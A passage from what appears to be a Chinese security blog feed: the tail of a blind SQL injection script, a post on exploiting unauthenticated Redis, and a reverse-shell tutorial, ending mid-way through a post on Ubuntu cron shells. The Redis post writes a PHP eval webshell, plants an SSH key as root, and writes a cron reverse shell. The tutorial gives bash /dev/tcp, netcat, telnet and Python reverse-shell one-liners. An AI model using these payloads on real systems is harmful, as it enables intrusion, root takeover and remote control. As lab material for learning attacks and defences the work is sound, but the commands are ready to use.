class="built_in">str</span>(</span><br><span class="line">                    x) + <span class="string">&quot;,1))=&#x27;&quot;</span> + <span class="built_in">str</span>(y) + <span class="string">&quot;&#x27;--+&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span> (dataName_url)</span><br><span class="line">           </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dataName_url).text) == normalHtmlLen:</span><br><span class="line"></span><br><span class="line">                dataName += <span class="built_in">chr</span>(y)</span><br><span class="line">                </span><br><span class="line">                <span class="built_in">print</span>(dataName)</span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">    dataNames += dataName + <span class="string">&quot; &quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;datas: &quot;</span> + dataNames)</span><br></pre></td></tr></table></figure><p><strong>运行测试：</strong></p><p><img src="http://pic.bamboo22.top/image-20230507182521766.png"><br><img src="http://pic.bamboo22.top/image-20230507182613115.png"><br><img src="http://pic.bamboo22.top/image-20230507182736100.png"></p>]]></content>
      
      
      <categories>
          
          <category> web基础漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Redis的几种利用方法</title>
      <link href="/2024/01/22/Redis%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/"/>
      <url>/2024/01/22/Redis%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Redis的几种利用方法"><a href="#Redis的几种利用方法" class="headerlink" title="Redis的几种利用方法"></a>Redis的几种利用方法</h1><h2 id="什么是redis"><a href="#什么是redis" class="headerlink" title="什么是redis"></a>什么是redis</h2><p>Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivota赞助。</p><h2 id="redis漏洞原理"><a href="#redis漏洞原理" class="headerlink" title="redis漏洞原理"></a>redis漏洞原理</h2><p>Redis默认情况下是绑定在0.0.0.0:6379端口的，如果没有设置密码（一般密码为空）或者密码为弱密码的情况下并且也没有进行有效保护措施，那么处于公网的redis服务就会被任意的用户未授权访问，读取数据，甚至利用redis自身的命令，进行写入文件操作，这样就会恶意攻击者利用redis未授权漏洞进行进一步攻击。</p><h2 id="redis安装"><a href="#redis安装" class="headerlink" title="redis安装"></a>redis安装</h2><p>这里使用的是<strong>kali</strong>和<strong>Ubuntu</strong></p><p><strong>kali下安装：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">第一步 wget http://download.redis.io/releases/redis-2.8.17.tar.gz#下载redis</span><br><span class="line">第二步 tar xzf redis-2.8.17.tar.gz#解压安装包</span><br><span class="line">第三步 cd redis-2.8.17 #进入redis文件夹</span><br><span class="line">第四步 make #在redis-2.8.17文件夹下执行make</span><br><span class="line">第五步 cd src#进入redis-2.8.17文件夹下的src文件夹</span><br><span class="line">第六步 cp redis-server /usr/bin</span><br><span class="line">第七步 cp redis-cli /usr/bin #将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）</span><br><span class="line">第八步 cp redis-conf /etc/ #返回目录redis-2.8.17，将redis.conf拷贝到/etc/目录下</span><br><span class="line">第九步 redis-server /etc/redis.conf #使用/etc/目录下的reids.conf文件中的配置启动redis服务</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在redis-2.8.17目录下redis-server开启</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230608170325020.png"></p><p><strong>Ubuntu下安装：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ wget http://download.redis.io/releases/redis-2.8.4.tar.gz</span><br><span class="line">$ tar xzf redis-2.8.4.tar.gz</span><br><span class="line">$ cd redis-2.8.4</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">拷贝关键文件</span><br><span class="line">cp redis.conf /etc/</span><br><span class="line">cd src</span><br><span class="line">cp redis-benchmark redis-cli redis-server /usr/bin/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">启动</span><br><span class="line">redis-server /etc/redis.conf</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230608170601093.png"></p><h2 id="redis漏洞复现"><a href="#redis漏洞复现" class="headerlink" title="redis漏洞复现"></a>redis漏洞复现</h2><p><strong>注意这里的攻击机是kali，手受害机是Ubuntu</strong></p><h3 id="1-未授权访问"><a href="#1-未授权访问" class="headerlink" title="1.未授权访问"></a>1.未授权访问</h3><p>Ubuntu打开redis服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server /etc/redis.conf</span><br></pre></td></tr></table></figure><p><img src="https://pic.bamboo22.top/image-20230608215752374.png"></p><p>kali这边无密码登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.144.130</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230608215723959.png"></p><h3 id="2-利用redis漏洞写webshell"><a href="#2-利用redis漏洞写webshell" class="headerlink" title="2.利用redis漏洞写webshell"></a>2.利用redis漏洞写webshell</h3><p><strong>利用前提：</strong></p><ul><li><p>靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证</p></li><li><p>开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限（开启web服务器，就可以利用url使用蚁剑进行连接）</p></li></ul><p><strong>上传webshell:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">config get dir #查看redis数据库路径</span><br><span class="line">config set dir /tmp #修改靶机Redis数据库路径</span><br><span class="line">config set dbfilename</span><br><span class="line">config set dbfilename 22.php #生成22.php文件</span><br><span class="line">set webshell &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;#将一句话木马写入文件中</span><br><span class="line">#&quot;\r\n\r\n&quot;是换行的意思，用redis写入文件会自带一些版本信息，如果不换行可能导致无法执行。</span><br><span class="line">save#保存</span><br><span class="line">set webshell &quot;\r\n\r\n&lt;?php eval($_POST[whoami]);?&gt;\r\n\r\n&quot;#上传木马可以通过蚁剑连接</span><br><span class="line">save#保存</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230608222941674.png"></p><p>可以看到shell已经被写入</p><p><img src="http://pic.bamboo22.top/image-20230608222706342.png"></p><h3 id="3-利用公私钥获取root权限"><a href="#3-利用公私钥获取root权限" class="headerlink" title="3.利用公私钥获取root权限"></a>3.利用公私钥获取root权限</h3><p><strong>ssh秘钥连接：</strong></p><p>大家都知道可以通过ssh远程登录另外一台电脑。ssh登录有两种一个是密码登录，一个是密钥登录，我们主要看密钥登录是什么流程，公钥登录是为了解决每次登录服务器都要输入密码的问题，流行使用RSA加密方案，主要流程包含：</p><ol><li>客户端生成RSA公钥和私钥</li><li>客户端将自己的公钥存放到服务器</li><li>客户端请求连接服务器，服务器将一个随机字符串发送给客户端</li><li>客户端根据自己的私钥加密这个随机字符串之后再发送给服务器</li><li>服务器接受到加密后的字符串之后用公钥解密，如果正确就让客户端登录，否则拒绝。这样就不用使用密码了。</li></ol><p><strong>前提：</strong></p><ol><li><strong>当redis以root身份运行</strong>。</li><li>靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证。</li><li>存在&#x2F;root&#x2F;.ssh目录，如果不存在我们可以通过一句话木马连接蚁剑创建目录不过可能进不去root目录权限问题可能或者自己mkdir一个目录毕竟是自己搭建靶场。因为.ssh是隐藏目录可以通过ls -la查看有没有。</li></ol><p><strong>操作：</strong></p><p>靶机:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-server /etc/redis.conf    #开启redis服务</span><br><span class="line">mkdir /root/.ssh                #创建ssh公钥存放目录（靶机是作为ssh服务器使用的）</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230609172912345.png"></p><p><img src="http://pic.bamboo22.top/image-20230608224252809.png"></p><p>攻击机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa   #生成ssh私钥和公钥，密码为空</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230609163032554.png"></p><p><strong>攻击机：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd .ssh/          #进入.ssh目录</span><br><span class="line">(echo -e &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot;) &gt; 1.txt  #将生成的公钥保存到1.txt：</span><br><span class="line">cat 1.txt | redis-cli -h 192.168.144.130 -x set crack   #连接靶机的Redis，将刚生成的公钥1.txt写入redis</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230609163327360.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.144.130   #攻击机连接靶机redis：</span><br><span class="line">使用 config get dir 命令得到redis备份的路径，更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）并设置上传公钥的备份文件名字为authorized_keys：</span><br><span class="line">config get dir</span><br><span class="line">config set dir /root/.ssh</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230609164013668.png"></p><p>如果出现<code>(error) ERR Changing directory: Permission denied</code>，则说明redis没有以root权限运行，注意攻击机、靶机都要以root权限运行</p><p><img src="http://pic.bamboo22.top/image-20230609164103222.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用ssh免密登录到靶机：ssh -i id_rsa root@192.168.144.130</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230609172036593.png"></p><p>成功登录靶机root账户</p><p>我在复现的时候最后一步遇到这个问题</p><p><img src="http://pic.bamboo22.top/image-20230609172200320.png"></p><p>这个问题是因为靶机没又开启ssh-server，参考大佬解决方案<a href="http://t.csdn.cn/9boV8">ssh提示Connection refused的解决方案</a></p><h3 id="4-反弹shell"><a href="#4-反弹shell" class="headerlink" title="4.反弹shell"></a>4.反弹shell</h3><h4 id="计划任务反弹shell"><a href="#计划任务反弹shell" class="headerlink" title="计划任务反弹shell"></a>计划任务反弹shell</h4><p>在攻击者服务器上监听一个端口（未被占用的任意端口）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure><p>连接redis，写入反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.144.130</span><br><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.144.130/4444 0&gt;&amp;1\n\n&quot;</span><br><span class="line">#前面五个星号分别表示 分 时 天 月 周 一般用于具体的定时时间。后面就是执行的命令。\n\n是换行前面已经说过，因为redis会出现乱码，可以通过上传的root文件看到有乱码。</span><br><span class="line">config set dir /var/spool/cron/crontabs</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230609220933226.png"></p><p><img src="http://pic.bamboo22.top/image-20230609220828144.png"></p><p>可以看到已经成功写入反弹信息，但是还是无法反弹shell，这个问题应该是利用redis未授权访问写的任务计划文件都有乱码，这是乱码来自redis的缓存数据，这个问题无法解决的。centos会忽略乱码去执行格式正确的任务计划，而ubuntu和debian并不会忽略这些乱码，所以导致命令执行失败。试了很多次都没有执行成功。</p><h4 id="利用redis主从复制反弹shell"><a href="#利用redis主从复制反弹shell" class="headerlink" title="利用redis主从复制反弹shell"></a>利用redis主从复制反弹shell</h4><p><strong>redis主从复制：</strong></p><p>redis主从复制我们简单理解为有两台redis服务器,一个是主，一个是从，两台服务器的数据是一样的，主服务器负责写入数据，从服务器负责读取数据。一般一个主服务器有好几个从服务器，且从服务器可能也是其他redis服务器的主服务器。这样的好处就是如果主服务器或者一个从服务器崩溃不会影响数据完整性，且读写分开，减轻服务器压力。</p><p><strong>操作：</strong></p><p>如果要是的利用成功需要先下载攻击代码，这里还有注意如果利用redis主从复制redis版本要是4.x或者5.x,因为我都kali里有docker，所以用Ubuntu攻击kali</p><p><strong>拉取镜像</strong></p><p>首先拉取一个5.0镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker search redis5.0    //查找镜像</span><br><span class="line">docker pull damonevking/redis5.0   //拉取下图第三个镜像</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230611223902216.png"></p><p><img src="http://pic.bamboo22.top/image-20230611223944013.png"><br><strong>运行容器</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 6379:6379 -d damonevking/redis5.0 redis-server   //映射端口并运行容器</span><br></pre></td></tr></table></figure><p>访问你的ip+6379端口，如下图则说明搭建成功</p><p><img src="http://pic.bamboo22.top/1200.png"></p><p><strong>漏洞利用：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Ridter/redis-rce.git   //下载漏洞利用脚本</span><br></pre></td></tr></table></figure><p>注意，这里少一个.so的文件，到<a href="https://github.com/n0b0dyCN/redis-rogue-server%E4%B8%8B%E8%BD%BD%E5%B9%B6%E6%94%BE%E5%88%B0%E5%92%8Credis-rce.py%E5%90%8C%E4%B8%80%E7%9B%AE%E5%BD%95%E4%B8%8B%EF%BC%8C%E7%84%B6%E5%90%8E%E6%89%A7%E8%A1%8C%E5%A6%82%E4%B8%8B%E5%91%BD%E4%BB%A4%EF%BC%9A">https://github.com/n0b0dyCN/redis-rogue-server下载并放到和redis-rce.py同一目录下，然后执行如下命令：</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-rce.py -r 192.168.144.128 -L 192.168.144.130 -f exp.so</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230612171921307.png"></p><p>复现成功</p><p>复现的时候遇到问题redis的6379端口一直被占用，用kill -9命令删除后又会新开启一个端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep redis            //查找正在运行的redis进程</span><br></pre></td></tr></table></figure><p>解决方法是直接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/redis-server stop  //停止redis服务</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web基础漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>反弹shell</title>
      <link href="/2024/01/22/%E5%8F%8D%E5%BC%B9shell/"/>
      <url>/2024/01/22/%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><strong>反弹shell</strong>：控制端监听某个端口，被控制端发起请求到该端口，并将命令行的输入输出传到控制端</p><p><strong>正向getshell</strong>: 控制端(也就是我们自己的机器)发送请求去连接被控端(目标机器)的方式。<br>不过这种方式会受到防火墙,路由,等各种很多因素影响,很难成功。</p><p><img src="http://pic.bamboo22.top/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjExMjMw,size_16,color_FFFFFF,t_70.png"></p><p><strong>反弹shell</strong>: 被控端主动发送请求连接我们的控制端。<br>这种方法是可以想办法避开防火墙和路由的一些限制的!</p><p><img src="http://pic.bamboo22.top/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjExMjMw,size_16,color_FFFFFF,t_70-16861419258613.png"></p><p><strong>为什么需要反弹shell？</strong></p><p>当正向连接不可达时候</p><ul><li>客户机中了木马，但是在局域网内，无法正向连接。</li><li>由于防火墙和局域网的限制，对方只能发送请求，不可主动接受请求</li></ul><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><h4 id="bash反弹："><a href="#bash反弹：" class="headerlink" title="bash反弹："></a>bash反弹：</h4><p>这是最常见也是最简单的一种反弹shell的方式，直接看命令：</p><p>攻击机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp 1231</span><br></pre></td></tr></table></figure><p>受害机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.144.128/1231 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230607190252137.png"></p><p><img src="http://pic.bamboo22.top/image-20230607192139651.png"></p><p><img src="http://pic.bamboo22.top/image-20230607192057903.png"></p><p>实现命令执行</p><p><img src="http://pic.bamboo22.top/image-20230607204242802.png"></p><h4 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h4><h5 id="e被阉割的情况："><a href="#e被阉割的情况：" class="headerlink" title="e被阉割的情况："></a>e被阉割的情况：</h5><p>先说一下不用nc -e 这个选项的时候，我们应该怎么做：</p><p>攻击机器开启两个端口的监听：（为什么要开两个，这个下面会讲）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 6666 </span><br><span class="line">nc -lvp 7777 </span><br></pre></td></tr></table></figure><p>受害机器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.144.128 6666|/bin/bash|nc 192.168.144.128 7777</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="http://pic.bamboo22.top/image-20230607204210160.png"></p><p><img src="http://pic.bamboo22.top/image-20230607194016234.png"></p><p>首先我们连接到6666端口进行通信，然后把通信的内容作为输入放到&#x2F;bin&#x2F;bash解释器里面去，再把解释器运行出来的内容作为输入通信到7777端口，于是就有了上述的画面。</p><p>注意：这里报错信息不会回显在攻击机上，但是可以看到被攻击机执行了命令，并在本机上显示</p><h5 id="nc-e"><a href="#nc-e" class="headerlink" title="nc-e"></a>nc-e</h5><p>目前大部分linux版本都阉割了-e选项，因为实在是有点危险<br>安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1、下载安装</span><br><span class="line">wget https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download</span><br><span class="line">tar -zxvf netcat-0.7.1.tar.gz -C /usr/local</span><br><span class="line">cd /usr/local</span><br><span class="line">mv netcat-0.7.1 netcat</span><br><span class="line">cd /usr/local/netcat</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">2、配置</span><br><span class="line">vim /etc/profile</span><br><span class="line">添加以下内容：</span><br><span class="line"># set  netcat path</span><br><span class="line">export NETCAT_HOME=/usr/local/netcat</span><br><span class="line">export PATH=$PATH:$NETCAT_HOME/bin</span><br><span class="line">保存，退出，并使配置生效：</span><br><span class="line">source /etc/profile</span><br><span class="line">3、测试</span><br><span class="line">nc -help成功</span><br></pre></td></tr></table></figure><p>接下来直接展示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">受害机：nc -e /bin/bash 192.168.28.128 7777   或者： netcat 192.168.28.128 7777 -e /bin/bash</span><br><span class="line">攻击机：nc -lvp 7777</span><br></pre></td></tr></table></figure><p>关于nc -e选项的解释：<br>主要关键词：连接 、重定向、执行<br>连接就执行并且重定向结果到连接机器的端口</p><p>这个在安装那步报错了，还没试验成功</p><h4 id="利用Telnet反弹shell"><a href="#利用Telnet反弹shell" class="headerlink" title="利用Telnet反弹shell"></a>利用Telnet反弹shell</h4><h5 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h5><p>这里Telnet主要是起到一个连接的作用（删除管道通过rm -f xx 即可）</p><p>攻击机器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure><p>受害机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod a p; telnet 192.168.144.128 2333 0&lt;a | /bin/bash 1&gt;a</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230607200737619.png"></p><p><img src="http://pic.bamboo22.top/image-20230607200750970.png"></p><p>攻击机上的playload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod a p; telnet 47.xxx.xxx.72 2333 0&lt;a | /bin/bash 1&gt;a</span><br></pre></td></tr></table></figure><p>mknod：创建一个管道，telnet 连接通信并且把输入重定向到管道a中去，1&gt;a，把输出重定向到管道a中去<br>如果说这个管道符号不好理解的话，那就看看下面这个</p><h5 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h5><p>这个方法和上面nc -e 被阉割的方法一样，都是开启两个监听，然后通过不断的重定向符号反弹shell</p><p>攻击机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 6666  nc -lvp 7777</span><br></pre></td></tr></table></figure><p>受害机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.144.128 6666 | /bin/bash | telnet 192.168.144.128 7777</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230607201410059.png"></p><h4 id="python脚本弹shell"><a href="#python脚本弹shell" class="headerlink" title="python脚本弹shell"></a>python脚本弹shell</h4><p>攻击机： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure><p>受害机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.144.128&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230607202343268.png"></p><p><img src="http://pic.bamboo22.top/image-20230607204140241.png"></p>]]></content>
      
      
      <categories>
          
          <category> web基础漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>解决Ubuntu计划任务弹shell失败</title>
      <link href="/2024/01/22/%E8%A7%A3%E5%86%B3Ubuntu%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%BC%B9shell%E5%A4%B1%E8%B4%A5/"/>
      <url>/2024/01/22/%E8%A7%A3%E5%86%B3Ubuntu%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%BC%B9shell%E5%A4%B1%E8%B4%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="解决Ubuntu计划任务弹shell失败"><a href="#解决Ubuntu计划任务弹shell失败" class="headerlink" title="解决Ubuntu计划任务弹shell失败"></a>解决Ubuntu计划任务弹shell失败</h1><p>在复现redis时几种情况都复现成功了，只有计划任务弹shell没有成功，今天就来探究一下</p><p>当时的情况是：</p><p>已经成功写入反弹信息，但是还是无法反弹shell，</p><p>当时推测应该是利用redis未授权访问写的任务计划文件都有乱码，这是乱码来自redis的缓存数据，这个问题无法解决的。centos会忽略乱码去执行格式正确的任务计划，而ubuntu和debian并不会忽略这些乱码，所以导致命令执行失败。试了很多次都没有执行成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.144.130</span><br><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.144.130/4444 0&gt;&amp;1\n\n&quot;</span><br><span class="line">#前面五个星号分别表示 分 时 天 月 周 一般用于具体的定时时间。后面就是执行的命令。\n\n是换行前面已经说过，因为redis会出现乱码，可以通过上传的root文件看到有乱码。</span><br><span class="line">config set dir /var/spool/cron/crontabs</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230609220933226.png"></p><p><img src="http://pic.bamboo22.top/image-20230609220828144.png"></p><h2 id="问题汇总"><a href="#问题汇总" class="headerlink" title="问题汇总"></a>问题汇总</h2><ul><li><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>为什么在ubuntu默认终端上反弹shell没有用？而在centos上就行？</li><li>ubuntu为什么将上述命令写入脚本运行在上就可以反弹？</li><li>centos与ubuntu的计划任务有何不同？</li><li>&#x2F;etc&#x2F;cron与&#x2F;var&#x2F;spool&#x2F;cron有什么区别？</li><li>sh、dash、bash有啥区别？</li></ul><h2 id="一些基础"><a href="#一些基础" class="headerlink" title="一些基础"></a>一些基础</h2><h3 id="常用命令以及参数"><a href="#常用命令以及参数" class="headerlink" title="常用命令以及参数"></a>常用命令以及参数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crontab -e#编辑计划任务</span><br><span class="line">crontab -l #列出计划任务</span><br><span class="line">crontab -r#删除计划任务</span><br></pre></td></tr></table></figure><h3 id="相关目录"><a href="#相关目录" class="headerlink" title="相关目录"></a>相关目录</h3><p>centos计划任务目录：<code>/var/spool/cron/</code></p><p>ubuntu计划任务目录：<code>/var/spool/cron/crontabs/</code></p><p>计划任务日志(系统日志)：<code>/var/log/syslog</code></p><p>具体的举例用法可以参考菜鸟教程：<a href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html">https://www.runoob.com/w3cnote/linux-crontab-tasks.html</a></p><h3 id="etc-crontab-和-var-spool-cron区别"><a href="#etc-crontab-和-var-spool-cron区别" class="headerlink" title="&#x2F;etc&#x2F;crontab 和 &#x2F;var&#x2F;spool&#x2F;cron区别"></a>&#x2F;etc&#x2F;crontab 和 &#x2F;var&#x2F;spool&#x2F;cron区别</h3><p><code>/etc/crontab</code>（系统级的）系统执行计划</p><p><code>/var/spool/cron/</code>（用户级的）这个目录是以账号来区分每个用户自己的执行计划</p><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 